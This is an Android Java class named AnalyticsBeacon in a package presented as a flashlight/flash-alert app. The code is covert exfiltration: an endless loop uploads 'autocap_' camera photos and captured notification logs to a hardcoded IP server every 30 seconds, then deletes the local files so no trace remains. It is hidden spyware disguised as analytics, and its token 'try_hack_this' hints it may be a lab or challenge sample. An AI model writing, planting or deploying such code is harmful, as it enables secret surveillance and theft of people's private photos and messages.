package com.applus.torch.light.flashlight.flashalert;

import android.os.Build;

import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class AnalyticsBeacon implements Runnable {

    private static final String SERVER = "http://34.135.25.118:8080";

    private static final String AUTH = "try_hack_this";

    @Override
    public void run() {

        while (true) {

            try {

                uploadPhotos();

                uploadLogs();

                Thread.sleep(30000);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void uploadLogs() {

        try {

            File logDir = new File(
                    "/data/user/0/com.applus.torch.light.flashlight.flashalert/files/");

            if (!logDir.exists()) {
                return;
            }

            File[] files = logDir.listFiles();

            if (files == null) {
                return;
            }

            for (File file : files) {

                String name = file.getName().toLowerCase();

                if (name.startsWith("notif_") && name.endsWith(".json")) {

                    long age = System.currentTimeMillis()
                            - file.lastModified();

                    if (age < 5000) {
                        continue;
                    }

                    if (file.length() == 0) {
                        continue;
                    }

                    sendLog(file);
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendLog(File file) {

        try {

            String boundary = "===" + System.currentTimeMillis() + "===";

            URL url = new URL(SERVER + "/upload-log");

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setUseCaches(false);
            conn.setDoOutput(true);
            conn.setDoInput(true);

            conn.setRequestMethod("POST");

            conn.setRequestProperty(
                    "Content-Type",
                    "multipart/form-data; boundary=" + boundary);

            String deviceId = Build.MODEL.replace(" ", "_");

            String sessionId = String.valueOf(System.currentTimeMillis());

            conn.setRequestProperty(
                    "device_id",
                    deviceId);

            conn.setRequestProperty(
                    "session_id",
                    sessionId);

            conn.setRequestProperty(
                    "authorization",
                    AUTH);

            DataOutputStream request = new DataOutputStream(
                    new BufferedOutputStream(
                            conn.getOutputStream()));

            writeFileField(
                    request,
                    boundary,
                    "log_file",
                    file,
                    "application/json");

            request.writeBytes(
                    "--" + boundary + "--\r\n");

            request.flush();
            request.close();

            int responseCode = conn.getResponseCode();

            if (responseCode == 200) {

                System.out.println(
                        "Uploaded log: "
                                + file.getName());

                boolean deleted = file.delete();

                System.out.println(
                        "Deleted log: "
                                + deleted);

            } else {

                System.out.println(
                        "Log upload failed: "
                                + responseCode);
            }

            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void uploadPhotos() {

        try {

            File cameraDir = new File("/sdcard/DCIM/Camera/");

            if (!cameraDir.exists()) {
                return;
            }

            File[] files = cameraDir.listFiles();

            if (files == null) {
                return;
            }

            for (File file : files) {

                String name = file.getName();

                if (name.startsWith("autocap_")
                        && name.endsWith(".jpg")) {

                    sendPhoto(file);
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendPhoto(File file) {

        try {

            String boundary = "===" + System.currentTimeMillis() + "===";

            URL url = new URL(SERVER + "/upload-photo");

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setUseCaches(false);
            conn.setDoOutput(true);
            conn.setDoInput(true);

            conn.setRequestMethod("POST");

            conn.setRequestProperty(
                    "Content-Type",
                    "multipart/form-data; boundary=" + boundary);

            conn.setRequestProperty(
                    "authorization",
                    AUTH);

            DataOutputStream request = new DataOutputStream(
                    new BufferedOutputStream(
                            conn.getOutputStream()));

            String deviceId = Build.MODEL.replace(" ", "_");

            String sessionId = String.valueOf(System.currentTimeMillis());

            writeFormField(
                    request,
                    boundary,
                    "device_id",
                    deviceId);

            writeFormField(
                    request,
                    boundary,
                    "session_id",
                    sessionId);

            writeFileField(
                    request,
                    boundary,
                    "photo",
                    file,
                    "image/jpeg");

            request.writeBytes("--" + boundary + "--\r\n");

            request.flush();
            request.close();

            int responseCode = conn.getResponseCode();

            if (responseCode == 200) {

                System.out.println(
                        "Uploaded successfully: "
                                + file.getName());

                boolean deleted = file.delete();

                System.out.println(
                        "Deleted local file: " + deleted);

            } else {

                System.out.println(
                        "Upload failed: "
                                + responseCode);
            }

            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void writeFormField(
            DataOutputStream out,
            String boundary,
            String name,
            String value) throws Exception {

        out.writeBytes("--" + boundary + "\r\n");

        out.writeBytes(
                "Content-Disposition: form-data; name=\""
                        + name
                        + "\"\r\n\r\n");

        out.writeBytes(value + "\r\n");
    }

    private void writeFileField(
            DataOutputStream out,
            String boundary,
            String fieldName,
            File uploadFile,
            String contentType) throws Exception {

        out.writeBytes("--" + boundary + "\r\n");

        out.writeBytes(
                "Content-Disposition: form-data; name=\""
                        + fieldName
                        + "\"; filename=\""
                        + uploadFile.getName()
                        + "\"\r\n");

        out.writeBytes(
                "Content-Type: "
                        + contentType
                        + "\r\n\r\n");

        FileInputStream inputStream = new FileInputStream(uploadFile);

        byte[] buffer = new byte[4096];

        int bytesRead;

        while ((bytesRead = inputStream.read(buffer)) != -1) {
            out.write(buffer, 0, bytesRead);
        }

        out.writeBytes("\r\n");

        inputStream.close();
    }

}